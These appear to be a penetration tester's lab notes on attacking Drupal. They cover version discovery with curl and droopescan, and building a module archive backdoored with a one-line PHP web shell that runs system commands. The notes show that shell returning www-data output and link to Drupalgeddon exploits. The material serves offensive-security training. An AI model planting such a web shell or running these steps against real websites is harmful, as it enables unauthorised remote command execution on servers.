# Discovery
```bash
curl -s http://drupal.inlanefreight.local | grep Drupal
```
Check /node/1 links

```
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""

curl -s http://drupal.inlanefreight.local/CHANGELOG.txt

droopescan scan drupal -u http://drupal.inlanefreight.local
```

# Enumeration
https://github.com/SamJoan/droopescan
Supported CMS are:
* SilverStripe
* [[Wordpress]]
* Drupal
Partial functionality for:
* [[joomla]] (version enumeration and interesting URLs only)
* Moodle (plugin & theme very limited, watch out)
```bash
git clone https://github.com/SamJoan/droopescan && cd droopescan
pip install -r requirements.txt

./droopescan scan drupal -u http://drupal.inlanefreight.local

[+] Plugins found:                                                              
    php http://drupal.inlanefreight.local/modules/php/
        http://drupal.inlanefreight.local/modules/php/LICENSE.txt

[+] No themes found.

[+] Possible version(s):
    8.9.0
    8.9.1

[+] Possible interesting urls found:
    Default admin - http://drupal.inlanefreight.local/user/login

[+] Scan finished (0:03:19.199526 elapsed)
```

# Attacks
## PHP Filter
installed by default before v8
or can be downloaded manually for >v8
```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```
## Uploading a Backdored Module
```bash
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz

echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]); ?>' > shell.php

cat .htaccess
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>

mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
Assuming we have administrative access to the website, click on Manage and then Extend on the sidebar. Next, click on the + Install new module button, and we will be taken to the install page, such as http://drupal.inlanefreight.local/admin/modules/install Browse to the backdored Captcha archive and click Install.
```bash
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## RCE
https://www.exploit-db.com/exploits/34992
https://www.exploit-db.com/exploits/44448
https://github.com/rithchard/Drupalgeddon3